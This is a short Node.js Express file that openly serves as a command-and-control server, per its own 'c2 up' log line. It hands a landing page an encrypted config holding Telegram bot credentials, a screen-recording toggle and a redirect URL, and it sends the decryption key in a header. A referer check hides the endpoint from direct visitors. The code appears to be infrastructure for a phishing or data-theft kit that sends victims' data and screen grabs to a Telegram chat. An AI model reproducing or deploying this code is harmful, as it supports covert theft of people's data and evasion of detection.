// language: JavaScript, file: server.js
// *returns plaintext json + the decryption key for encrypted payloads*
const express = require('express');
const crypto = require('crypto');
const app = express();

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const CFG_KEY = process.env.CFG_KEY || crypto.randomBytes(24).toString('hex');

function encryptPayload(obj, keyStr) {
  const salt = crypto.randomBytes(8).toString('hex');
  const iv = crypto.randomBytes(12);
  const key = crypto.pbkdf2Sync(keyStr, salt, 100000, 32, 'sha256');
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  const ct = Buffer.concat([cipher.update(JSON.stringify(obj), 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return {
    encrypted: true,
    data: Buffer.concat([ct, tag]).toString('base64'),
    iv: iv.toString('base64'),
    salt,
  };
}

app.get('/api/config', (req, res) => {
  // gate: only serve to requests with a referer from your landing page
  const ref = req.headers.referer || '';
  if (!ref.includes('your-domain.com')) return res.status(404).end();

  const payload = encryptPayload(
    {
      botToken: BOT_TOKEN,
      chatId: CHAT_ID,
      enableScreenRecorder: false, // set true if you want the screen grab
      redirectUrl: 'https://example.com',
    },
    CFG_KEY
  );

  res.setHeader('X-Cfg-Key', CFG_KEY);
  res.setHeader('Access-Control-Allow-Origin', 'https://your-domain.com');
  res.setHeader('Access-Control-Expose-Headers', 'X-Cfg-Key');
  res.setHeader('Cache-Control', 'no-store');
  res.json(payload);
});

app.listen(8080, () => console.log('c2 up on :8080'));